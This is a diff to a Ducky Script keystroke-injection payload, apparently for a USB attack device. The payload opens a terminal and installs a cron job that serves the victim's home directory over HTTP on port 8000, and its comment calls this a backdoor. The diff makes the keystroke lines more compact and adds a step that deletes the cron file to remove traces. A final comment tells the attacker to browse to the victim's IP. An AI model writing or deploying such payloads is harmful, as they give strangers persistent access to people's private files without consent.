@@ -7,12 +7,11 @@ DEFAULT_DELAY 400
 ALT t
 
 REM Create backdoor
-STRING echo "* * * * * cd ~ && python2 -m SimpleHTTPServer 8000" > cron
-ENTER
-STRING crontab -i cron
-ENTER
+STRINGLN echo "* * * * * cd ~ && python2 -m SimpleHTTPServer 8000" > cron
+STRINGLN crontab -i cron
 
-REM Close window to run stealthily
+REM Clean up
+STRINGLN rm cron
 ALT F4
 
 REM You can now interact with this by navigating to http://[Victim IP]:8000 in a browser
